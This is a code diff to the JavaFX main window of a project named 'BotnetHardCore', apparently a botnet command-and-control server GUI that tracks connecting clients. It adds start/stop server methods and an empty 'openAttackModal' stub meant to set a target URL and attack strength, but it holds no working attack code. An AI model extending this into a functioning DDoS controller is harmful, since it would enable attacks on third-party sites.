@@ -1,4 +1,6 @@
-package br.com.pricher.server.view;/**
+package br.com.pricher.server.view;
+
+/**
  * Project: BotnetHardCore
  * Client: Jeferson Machado <jefersonmachado@univille.br>
  * Date: 22/07/2018
@@ -35,7 +37,14 @@ public class MainApp extends Application implements OnServerCallback {
 
         initRootLayout();
         loadContent();
-        Server.Start(this, 8094);
+    }
+
+    public void startServer(int port) {
+        Server.Start(this, port);
+    }
+
+    public void stopServer() {
+
     }
 
     /**
@@ -57,9 +66,6 @@ public class MainApp extends Application implements OnServerCallback {
         }
     }
 
-    /**
-     * Mostra o person overview dentro do root layout.
-     */
     private void loadContent() {
         try {
             FXMLLoader loader = new FXMLLoader();
@@ -76,15 +82,6 @@ public class MainApp extends Application implements OnServerCallback {
         }
     }
 
-    /**
-     * Retorna o palco principal
-     *
-     * @return
-     */
-    public Stage getPrimaryStage() {
-        return mPrimaryStage;
-    }
-
     @Override
     public void onClientConnected(Client client) {
         mClientController.add(client);
@@ -98,5 +95,9 @@ public class MainApp extends Application implements OnServerCallback {
     @Override
     public void onServerDisconnect() {
 
+    }
+
+    public void openAttackModal() {
+        // Mostrar url de destino e potencia
     }
 }
